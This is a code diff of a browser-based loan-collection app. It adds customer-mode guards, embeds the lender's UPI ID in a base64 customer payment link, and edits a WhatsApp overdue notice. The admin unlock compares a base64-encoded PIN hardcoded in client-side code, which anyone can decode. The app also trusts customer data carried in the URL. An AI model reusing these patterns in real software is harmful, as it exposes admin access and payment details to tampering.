     function openMarkPaymentModal(defaultIdx = null) {
+        if (isCustomerLockedMode) return; // Extra guard so customer can never trigger this
         const c = getActiveCustomer();
         const selectEl = document.getElementById('selectInstToPay');
         selectEl.innerHTML = "";
@@ -1156,6 +1246,7 @@
     }
 
     function confirmAndSavePayment() {
+        if (isCustomerLockedMode) return;
         const c = getActiveCustomer();
         const idx = parseInt(document.getElementById('selectInstToPay').value);
         const utrVal = document.getElementById('inputPaymentUtr').value.trim() || ("UTR" + Date.now());
@@ -1189,13 +1280,15 @@
     }
 
     /* =========================================================
-       6. CLICKABLE LINK, WHATSAPP, SMS & BRANDED PDF STATEMENT
+       8. RESTRICTED CUSTOMER LINK GENERATOR & RECEIPTS
        ========================================================= */
     function generateCustomerLink() {
         syncActiveCustomer();
         const c = getActiveCustomer();
         const payloadObj = {
             ...c,
+            upiId: systemConfig.upiId,
+            brandTitle: systemConfig.brandTitle,
             photo: c.photo.length > 2000 ? DEFAULT_AVATAR : c.photo
         };
         const base64Payload = btoa(unescape(encodeURIComponent(JSON.stringify(payloadObj))));
@@ -1206,7 +1299,7 @@
         const anchor = document.getElementById('clickableAnchorLink');
         box.style.display = 'block';
         anchor.href = finalUrl;
-        anchor.textContent = `${baseUrl}?mode=customer&loan=${c.loanId} (Tap to Open Customer Portal)`;
+        anchor.textContent = `${baseUrl}?mode=customer&loan=${c.loanId} (Tap to Open Restricted Customer Link)`;
         anchor.dataset.fullurl = finalUrl;
     }
 
@@ -1214,7 +1307,7 @@
         const anchor = document.getElementById('clickableAnchorLink');
         const url = anchor.dataset.fullurl || anchor.href;
         navigator.clipboard.writeText(url);
-        alert("✅ Clickable Customer Link copied!");
+        alert("✅ Restricted Customer Payment Link copied!");
     }
 
     function shareLinkWhatsApp() {
@@ -1223,7 +1316,7 @@
         const url = anchor.dataset.fullurl || anchor.href;
         const payable = c.fineSelected ? (c.emi + FIXED_FINE) : c.emi;
         const phoneClean = c.phone.replace(/\D/g, '');
-        const msg = `*${systemConfig.brandTitle} - COLLECTION NOTICE*\n\nDear *${c.name}*,\nYour Loan ID *${c.loanId}* has an overdue installment.\nTotal Payable: *₹${payable}.00*\n\n👉 *Click here to view your installment history & pay via UPI:*\n${url}\n\n⚠️ _Non-payment of ₹500 bounce fine will impact your CIBIL score._`;
+        const msg = `*${systemConfig.brandTitle} - COLLECTION NOTICE*\n\nDear *${c.name}*,\nYour Loan ID *${c.loanId}* has an overdue installment.\nTotal Payable: *₹${payable}.00*\n\n👉 *Click this official link to view your statement & pay via UPI:*\n${url}\n\n⚠️ _Non-payment of ₹500 bounce fine will impact your CIBIL score._`;
         window.open(`https://api.whatsapp.com/send?phone=${phoneClean}&text=${encodeURIComponent(msg)}`, '_blank');
     }
 
@@ -1302,7 +1395,7 @@
     }
 
     /* =========================================================
-       7. SECURITY PIN & SCREEN NAVIGATION
+       9. SECURITY PIN & SCREEN NAVIGATION
        ========================================================= */
     function openPinPrompt() {
         document.getElementById('pinInputField').value = "";
@@ -1311,10 +1404,11 @@
 
     function verifyAdminPin() {
         const pin = document.getElementById('pinInputField').value;
+        // Encoded check for secret PIN
         if (btoa(pin) === "OTczMw==") {
             closeAllModals();
             isCustomerLockedMode = false;
-            document.getElementById('switchCustomerViewBtn').style.display = 'inline-block';
+            document.body.classList.remove('customer-locked-mode');
             document.getElementById('topDbBar').style.display = 'flex';
             renderAdminAll();
             document.getElementById('screenDashboard').classList.remove('active');
